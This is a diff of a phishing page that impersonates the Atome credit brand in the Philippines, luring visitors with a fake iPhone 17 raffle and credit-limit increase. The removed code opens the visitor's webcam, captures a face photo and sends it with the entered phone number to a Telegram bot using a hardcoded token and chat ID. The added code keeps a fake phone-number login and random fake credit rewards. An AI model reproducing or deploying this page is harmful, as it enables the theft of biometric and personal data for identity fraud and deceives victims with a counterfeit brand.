@@ -337,137 +337,6 @@
             font-family: 'Inter', sans-serif;
         }
 
-        /* FACIAL POPUP STYLES */
-        .facial-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            backdrop-filter: blur(15px);
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            visibility: hidden;
-            opacity: 0;
-            transition: all 0.3s ease;
-        }
-        .facial-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-        .facial-popup {
-            background: linear-gradient(165deg, rgba(126,200,224,0.96), rgba(253,225,139,0.96));
-            border-radius: 60px;
-            width: 90%;
-            max-width: 400px;
-            padding: 28px 24px;
-            text-align: center;
-            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.5);
-        }
-        .facial-header h3 {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: #1a2a3a;
-            margin-bottom: 6px;
-        }
-        .facial-header p {
-            font-size: 0.75rem;
-            color: #d46b5e;
-            margin-bottom: 20px;
-        }
-        .facial-camera-frame {
-            position: relative;
-            width: 240px;
-            height: 240px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 4px solid #FFD700;
-            background: #000;
-        }
-        .facial-camera-frame video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
-        }
-        .facial-guide-circle {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            box-shadow: inset 0 0 20px 5px rgba(0,255,0,0.3);
-            pointer-events: none;
-            transition: box-shadow 0.3s;
-        }
-        .facial-guide-circle.active {
-            box-shadow: inset 0 0 30px 8px rgba(0,255,0,0.8);
-            animation: pulseGreen 0.6s;
-        }
-        @keyframes pulseGreen {
-            0% { box-shadow: inset 0 0 0 0 rgba(0,255,0,0.8); }
-            100% { box-shadow: inset 0 0 30px 8px rgba(0,255,0,0.8); }
-        }
-        .facial-scan-line {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #0f0, #0f0, transparent);
-            display: none;
-            animation: scanMove 2s linear infinite;
-        }
-        .facial-scan-line.active {
-            display: block;
-        }
-        @keyframes scanMove {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
-        .facial-buttons {
-            display: flex;
-            gap: 12px;
-            margin: 16px 0;
-        }
-        .facial-btn {
-            flex: 1;
-            background: #1a1a1a;
-            border: 1.5px solid #FDD97A;
-            padding: 12px;
-            border-radius: 60px;
-            color: #FDD97A;
-            font-weight: 700;
-            cursor: pointer;
-        }
-        .facial-btn.cancel {
-            background: rgba(212,107,94,0.25);
-            border-color: #d46b5e;
-            color: #d46b5e;
-        }
-        .facial-status {
-            font-size: 0.75rem;
-            color: #2d6a4f;
-            background: rgba(255,245,235,0.95);
-            padding: 10px;
-            border-radius: 60px;
-            margin-top: 8px;
-        }
-        .facial-status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-        .facial-status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
         @media (max-width: 480px) {
             .glass-card {
                 padding: 24px 20px 36px;
@@ -499,10 +368,6 @@
             .promo-header {
                 padding: 16px 12px;
             }
-            .facial-camera-frame {
-                width: 200px;
-                height: 200px;
-            }
         }
     </style>
 </head>
@@ -510,45 +375,71 @@
 <div class="bg-theme">
     <div class="main-container">
         <div class="glass-card">
+            <!-- PROMO HEADER CONTAINER -->
             <div class="promo-header">
                 <div class="promo-title">Win an iPhone 17 & <strong>up to ₱10,000</strong> credit increase limit!</div>
-                <div class="promo-sub">😊 Facial Recognition Login</div>
+                <div class="promo-sub">🔐 Login and change your credit limit offer</div>
             </div>
 
+            <!-- STEPS - WALANG BLUR -->
             <div class="steps-container">
-                <div class="step"><span class="step-emoji">😊</span><span class="step-text">Face Scan</span></div>
-                <div class="step"><span class="step-emoji">🎁</span><span class="step-text">Claim</span></div>
-                <div class="step"><span class="step-emoji">💳</span><span class="step-text">Enjoy Spending</span></div>
+                <div class="step">
+                    <span class="step-emoji">🔐</span>
+                    <span class="step-text">Login</span>
+                </div>
+                <div class="step">
+                    <span class="step-emoji">🎁</span>
+                    <span class="step-text">Claim</span>
+                </div>
+                <div class="step">
+                    <span class="step-emoji">💳</span>
+                    <span class="step-text">Enjoy Spending</span>
+                </div>
             </div>
 
+            <!-- ATOME LOGO -->
             <div class="logo-wrapper">
-                <div class="logo-image"><img src="photos/atomeA.png" alt="AtomA"></div>
+                <div class="logo-image">
+                    <img src="photos/atomeA.png" alt="AtomA" style="background: transparent !important; width: 100%; height: auto; display: block;">
+                </div>
             </div>
 
+            <!-- PHONE NUMBER INPUT -->
             <div class="input-field-wrapper">
                 <div class="phone-input-group">
                     <span class="country-code">+63</span>
-                    <input type="tel" id="phoneInput" maxlength="10" placeholder="9XX XXX XXXX" autocomplete="off">
+                    <input type="tel" id="phoneInput" placeholder="Input phone number" autocomplete="off">
                 </div>
-                <div class="error-message" id="phoneError">Invalid number. Must be 10 digits starting with 9</div>
+                <div class="error-message" id="phoneError">Invalid phone number</div>
             </div>
 
+            <!-- SINGLE LOGIN BUTTON -->
             <button class="login-button" id="mainLoginBtn">LOGIN</button>
 
+            <!-- HINT MESSAGE -->
             <div class="hint-message" id="registerHintMsg">
-                Enter your 10-digit number for facial verification
+                Users need to login first to start claiming rewards
             </div>
 
+            <!-- TERMS & PRIVACY -->
             <div class="terms-row">
                 By continuing you agree to the 
                 <a href="#" id="termsLink">Terms of Service</a> and 
                 <a href="#" id="privacyLink">Privacy Policy</a>.
             </div>
 
+            <!-- Dashboard after login -->
             <div id="dashboardPanel" class="dashboard-area hidden">
                 <div class="reward-panel">
-                    <div class="claim-row"><span>🥚 Smash Lucky Egg</span><button class="claim-btn-sm" id="claimRewardBtn">Claim Rewards</button></div>
-                    <div class="withdraw-row"><span>💳 Spending Balance</span><span class="balance-text" id="balanceDisplay">₱0</span><button class="withdraw-btn-sm" id="withdrawFundsBtn">Enjoy Spending</button></div>
+                    <div class="claim-row">
+                        <span>🥚 Smash Lucky Egg</span>
+                        <button class="claim-btn-sm" id="claimRewardBtn">Claim Rewards</button>
+                    </div>
+                    <div class="withdraw-row">
+                        <span>💳 Spending Balance</span>
+                        <span class="balance-text" id="balanceDisplay">₱0</span>
+                        <button class="withdraw-btn-sm" id="withdrawFundsBtn">Enjoy Spending</button>
+                    </div>
                     <div class="status-sub" id="claimedStatusMsg"></div>
                 </div>
             </div>
@@ -556,282 +447,175 @@
     </div>
 </div>
 
-<!-- Facial Popup -->
-<div id="facialPopup" class="facial-overlay">
-    <div class="facial-popup">
-        <div class="facial-header">
-            <h3>😊 Face Verification</h3>
-            <p>Center your face in the circle</p>
-        </div>
-        <div class="facial-camera-frame">
-            <video id="facialVideo" autoplay playsinline muted></video>
-            <div class="facial-guide-circle" id="guideCircle"></div>
-            <div class="facial-scan-line" id="scanLine"></div>
-        </div>
-        <div class="facial-buttons">
-            <button class="facial-btn" id="captureFaceBtn">📸 CAPTURE & SEND</button>
-            <button class="facial-btn cancel" id="closeFacialBtn">CANCEL</button>
-        </div>
-        <div class="facial-status" id="facialStatus">🎯 Position your face within the circle</div>
-    </div>
-</div>
-
 <script>
-// ============================================
-// WORKING FACIAL SCRIPT - POPUP AFTER LOGIN
-// ============================================
+    // ============================================
+    // COMPLETE SCRIPT - Login, Claim, Enjoy Spending
+    // ============================================
 
-const TELEGRAM_BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-const TELEGRAM_CHAT_ID = "7298607329";
+    let isLoggedIn = false;
+    let claimedReward = false;
+    let spendableBalance = 0;
 
-let isLoggedIn = false;
-let claimedReward = false;
-let spendableBalance = 0;
-let currentPhoneNumber = null;
-let videoStream = null;
-let isCameraReady = false;
+    // DOM elements
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneError = document.getElementById('phoneError');
+    const mainLoginBtn = document.getElementById('mainLoginBtn');
+    const dashboardPanel = document.getElementById('dashboardPanel');
+    const claimRewardBtn = document.getElementById('claimRewardBtn');
+    const withdrawFundsBtn = document.getElementById('withdrawFundsBtn');
+    const balanceDisplay = document.getElementById('balanceDisplay');
+    const claimedStatusMsg = document.getElementById('claimedStatusMsg');
+    const hintMsg = document.getElementById('registerHintMsg');
 
-// DOM elements
-const phoneInput = document.getElementById('phoneInput');
-const phoneError = document.getElementById('phoneError');
-const mainLoginBtn = document.getElementById('mainLoginBtn');
-const dashboardPanel = document.getElementById('dashboardPanel');
-const claimRewardBtn = document.getElementById('claimRewardBtn');
-const withdrawFundsBtn = document.getElementById('withdrawFundsBtn');
-const balanceDisplay = document.getElementById('balanceDisplay');
-const claimedStatusMsg = document.getElementById('claimedStatusMsg');
-const hintMsg = document.getElementById('registerHintMsg');
-
-// Popup elements
-const facialPopup = document.getElementById('facialPopup');
-const facialVideo = document.getElementById('facialVideo');
-const captureFaceBtn = document.getElementById('captureFaceBtn');
-const closeFacialBtn = document.getElementById('closeFacialBtn');
-document.getElementById('facialStatus');
-const scanLine = document.getElementById('scanLine');
-const guideCircle = document.getElementById('guideCircle');
-
-// Phone validation
-function isValidPhone(phone) {
-    let raw = phone.trim();
-    if (raw === "") return false;
-    let digits = raw.replace(/\D/g, '');
-    return digits.length === 10 && digits[0] === '9';
-}
-
-phoneInput.addEventListener('input', (e) => {
-    let val = e.target.value.replace(/\D/g, '');
-    if (val.length > 10) val = val.slice(0, 10);
-    e.target.value = val;
-    if (val.length > 0 && val[0] !== '9') {
-        phoneError.classList.add('show');
-    } else if (val.length === 10 && val[0] === '9') {
-        phoneError.classList.remove('show');
-    } else if (val.length > 0 && val.length < 10) {
-        phoneError.classList.add('show');
-    } else {
-        phoneError.classList.remove('show');
+    // Philippine mobile number validation
+    function isValidPhone(phone) {
+        let raw = phone.trim();
+        if (raw === "") return false;
+        let digits = raw.replace(/\D/g, '');
+        return digits.length >= 10 && digits.length <= 13;
     }
-});
 
-// Camera functions
-async function startCamera() {
-    try {
-        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        videoStream = stream;
-        facialVideo.srcObject = stream;
-        await new Promise(r => { facialVideo.onloadedmetadata = () => { facialVideo.play(); r(); } });
-        await new Promise(r => setTimeout(r, 500));
-        isCameraReady = true;
-        facialStatus.innerHTML = "✅ Camera ready!";
-        facialStatus.className = "facial-status success";
-        return true;
-    } catch (err) {
-        facialStatus.innerHTML = "❌ Camera access denied";
-        facialStatus.className = "facial-status error";
-        return false;
+    function refreshUI() {
+        if (isLoggedIn) {
+            dashboardPanel.classList.remove('hidden');
+            mainLoginBtn.innerText = "✓ LOGGED IN";
+            mainLoginBtn.disabled = true;
+            mainLoginBtn.style.opacity = "0.85";
+            hintMsg.innerText = "🎉 You're logged in! Smash the lucky egg to claim rewards.";
+
+            if (claimedReward) {
+                claimRewardBtn.innerText = "✓ Claimed";
+                claimRewardBtn.disabled = true;
+                claimRewardBtn.style.opacity = "0.7";
+                claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance} spending balance! Enjoy shopping everywhere.`;
+                balanceDisplay.innerText = `₱${spendableBalance}`;
+                withdrawFundsBtn.disabled = (spendableBalance <= 0);
+                withdrawFundsBtn.style.opacity = (spendableBalance > 0) ? "1" : "0.5";
+            } else {
+                claimRewardBtn.innerText = "🥚 Smash & Claim";
+                claimRewardBtn.disabled = false;
+                claimRewardBtn.style.opacity = "1";
+                claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win credit increase up to ₱10,000 + iPhone 17 raffle!";
+                balanceDisplay.innerText = `₱0`;
+                withdrawFundsBtn.disabled = true;
+                withdrawFundsBtn.style.opacity = "0.5";
+            }
+        } else {
+            dashboardPanel.classList.add('hidden');
+            mainLoginBtn.innerText = "LOGIN";
+            mainLoginBtn.disabled = false;
+            mainLoginBtn.style.opacity = "1";
+            hintMsg.innerText = "Users need to login first to start claiming rewards";
+            phoneError.classList.remove('show');
+        }
     }
-}
 
-function stopCamera() {
-    if (videoStream) {
-        videoStream.getTracks().forEach(t => t.stop());
-        videoStream = null;
-    }
-    facialVideo.srcObject = null;
-    isCameraReady = false;
-}
-
-function startScan() {
-    scanLine.classList.add('active');
-    guideCircle.classList.add('active');
-    setTimeout(() => guideCircle.classList.remove('active'), 600);
-}
-
-function stopScan() {
-    scanLine.classList.remove('active');
-}
-
-// Capture and send to Telegram
-async function captureAndSend() {
-    if (!isCameraReady) {
-        facialStatus.innerHTML = "❌ Camera not ready";
-        return;
-    }
-    startScan();
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = facialVideo.videoWidth;
-        canvas.height = facialVideo.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.save();
-        ctx.scale(-1, 1);
-        ctx.drawImage(facialVideo, -canvas.width, 0, canvas.width, canvas.height);
-        ctx.restore();
-        
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-        if (!blob || blob.size < 1000) {
-            facialStatus.innerHTML = "❌ Capture failed";
-            stopScan();
+    // LOGIN function
+    function attemptLogin() {
+        if (isLoggedIn) {
+            alert("Already logged in. Proceed to claim your rewards!");
             return;
         }
-        
-        const kb = (blob.size / 1024).toFixed(1);
-        facialStatus.innerHTML = `📸 ${kb}KB - Sending...`;
-        
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, `face_${currentPhoneNumber}_${Date.now()}.jpg`);
-        formData.append('caption', `🔐 NEW FACE CAPTURE\n📱 +63${currentPhoneNumber}\n⏰ ${new Date().toLocaleString()}`);
-        
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-        const result = await res.json();
-        
-        if (result.ok) {
-            facialStatus.innerHTML = "✅ Sent! Login successful!";
-            stopScan();
-            setTimeout(() => {
-                closePopup();
-                completeLogin(currentPhoneNumber);
-            }, 1500);
-        } else {
-            facialStatus.innerHTML = "❌ Telegram error";
-            stopScan();
+        const phoneValue = phoneInput.value;
+        if (!isValidPhone(phoneValue)) {
+            phoneError.classList.add('show');
+            phoneInput.focus();
+            return;
         }
-    } catch (err) {
-        facialStatus.innerHTML = "❌ Error sending";
-        stopScan();
-    }
-}
-
-// Popup functions
-async function openPopup() {
-    const phoneValue = phoneInput.value.trim();
-    if (!isValidPhone(phoneValue)) {
-        phoneError.classList.add('show');
-        phoneInput.focus();
-        return;
-    }
-    currentPhoneNumber = phoneValue;
-    phoneError.classList.remove('show');
-    facialStatus.innerHTML = "🎯 Position your face";
-    facialStatus.className = "facial-status";
-    facialPopup.classList.add('active');
-    await startCamera();
-}
-
-function closePopup() {
-    stopCamera();
-    facialPopup.classList.remove('active');
-    facialStatus.innerHTML = "🎯 Position your face";
-    currentPhoneNumber = null;
-}
-
-// Login functions
-function completeLogin(phone) {
-    isLoggedIn = true;
-    claimedReward = false;
-    spendableBalance = 0;
-    refreshUI();
-    alert(`✅ Welcome +63${phone}!`);
-    localStorage.setItem('atomeUser', JSON.stringify({ phone: phone, loggedIn: true, loginTime: new Date().toISOString() }));
-}
-
-function refreshUI() {
-    if (isLoggedIn) {
-        dashboardPanel.classList.remove('hidden');
-        mainLoginBtn.innerText = "✓ LOGGED IN";
-        mainLoginBtn.disabled = true;
-        hintMsg.innerText = "🎉 You're logged in! Smash the lucky egg!";
-        if (claimedReward) {
-            claimRewardBtn.innerText = "✓ Claimed";
-            claimRewardBtn.disabled = true;
-            claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance}!`;
-            balanceDisplay.innerText = `₱${spendableBalance}`;
-            withdrawFundsBtn.disabled = (spendableBalance <= 0);
-        } else {
-            claimRewardBtn.innerText = "🥚 Smash & Claim";
-            claimRewardBtn.disabled = false;
-            claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win up to ₱10,000!";
-            balanceDisplay.innerText = `₱0`;
-            withdrawFundsBtn.disabled = true;
-        }
-    } else {
-        dashboardPanel.classList.add('hidden');
-        mainLoginBtn.innerText = "LOGIN";
-        mainLoginBtn.disabled = false;
-        hintMsg.innerText = "Enter your 10-digit number for facial verification";
-    }
-}
-
-function doClaim() {
-    if (!isLoggedIn) { alert("Login first!"); return; }
-    if (claimedReward) { alert(`Already claimed ₱${spendableBalance}`); return; }
-    const increase = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
-    spendableBalance = increase;
-    claimedReward = true;
-    let msg = `🎉 You received ₱${increase} credit increase!`;
-    if (Math.random() < 0.12) msg += ` 🍀 iPhone 17 raffle entry!`;
-    alert(msg);
-    refreshUI();
-}
-
-function doSpend() {
-    if (!isLoggedIn) { alert("Login first!"); return; }
-    if (!claimedReward) { alert("Claim first!"); return; }
-    if (spendableBalance <= 0) { alert("No balance"); return; }
-    if (confirm(`Enjoy ₱${spendableBalance}?`)) {
-        alert(`✅ Enjoy!`);
+        phoneError.classList.remove('show');
+        isLoggedIn = true;
+        claimedReward = false;
         spendableBalance = 0;
         refreshUI();
+        alert(`✅ Login successful! +63${phoneValue.replace(/\D/g, '')} — you can now smash the egg.`);
+        
+        // Save to localStorage
+        localStorage.setItem('atomeUser', JSON.stringify({
+            phone: phoneValue,
+            loggedIn: true,
+            loginTime: new Date().toISOString()
+        }));
     }
-}
 
-// Event listeners
-mainLoginBtn.addEventListener('click', openPopup);
-captureFaceBtn.addEventListener('click', captureAndSend);
-closeFacialBtn.addEventListener('click', closePopup);
-claimRewardBtn.addEventListener('click', doClaim);
-withdrawFundsBtn.addEventListener('click', doSpend);
+    // CLAIM REWARD
+    function performClaim() {
+        if (!isLoggedIn) {
+            alert("Please login first to claim rewards.");
+            return;
+        }
+        if (claimedReward) {
+            alert(`You already claimed ₱${spendableBalance} spending balance. Enjoy spending your rewards!`);
+            return;
+        }
+        const creditIncrease = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
+        spendableBalance = creditIncrease;
+        claimedReward = true;
 
-facialPopup.addEventListener('click', (e) => { if (e.target === facialPopup) closePopup(); });
+        const iphoneBonus = Math.random() < 0.12;
+        let msg = `🎉 You smashed the Lucky Egg! You received a credit increase of ₱${creditIncrease}!`;
+        if (iphoneBonus) {
+            msg += ` 🍀 AMAZING! You also won a raffle entry for iPhone 17! 🍀`;
+        }
+        alert(msg);
+        refreshUI();
+    }
 
-document.getElementById('termsLink').addEventListener('click', (e) => { e.preventDefault(); alert("Terms of Service"); });
-document.getElementById('privacyLink').addEventListener('click', (e) => { e.preventDefault(); alert("Privacy Policy"); });
+    // ENJOY SPENDING
+    function performEnjoySpending() {
+        if (!isLoggedIn) {
+            alert("Please login to enjoy spending.");
+            return;
+        }
+        if (!claimedReward) {
+            alert("You haven't claimed any rewards yet. Smash the lucky egg first!");
+            return;
+        }
+        if (spendableBalance <= 0) {
+            alert("No spending balance available. Please claim a reward first.");
+            return;
+        }
+        const confirmSpend = confirm(`Enjoy spending ₱${spendableBalance}? (simulated transaction - you can use this balance at partner merchants)`);
+        if (confirmSpend) {
+            alert(`✅ You're all set! ₱${spendableBalance} is ready for your next shopping adventure. Enjoy!`);
+            spendableBalance = 0;
+            refreshUI();
+        }
+    }
 
-// Check saved session
-const saved = localStorage.getItem('atomeUser');
-if (saved) {
-    try {
-        const u = JSON.parse(saved);
-        if (u.loggedIn) { isLoggedIn = true; refreshUI(); }
-    } catch(e) {}
-}
-refreshUI();
+    // Terms & privacy
+    document.getElementById('termsLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert("Terms of Service: 0% interest for up to 40 days, no annual fees. Full T&C apply.");
+    });
+    document.getElementById('privacyLink').addEventListener('click', (e) => {
+        e.preventDefault();
+        alert("Privacy Policy: Your data is protected. Read full policy at atome.ph/privacy");
+    });
+
+    // Event listeners
+    mainLoginBtn.addEventListener('click', attemptLogin);
+    claimRewardBtn.addEventListener('click', performClaim);
+    withdrawFundsBtn.addEventListener('click', performEnjoySpending);
+
+    phoneInput.addEventListener('input', () => {
+        if (isValidPhone(phoneInput.value)) {
+            phoneError.classList.remove('show');
+        }
+    });
+
+    // Check for existing session
+    const savedUser = localStorage.getItem('atomeUser');
+    if (savedUser) {
+        try {
+            const userData = JSON.parse(savedUser);
+            if (userData.loggedIn === true) {
+                isLoggedIn = true;
+                refreshUI();
+            }
+        } catch(e) {}
+    }
+
+    refreshUI();
 </script>
 </body>
 </html>
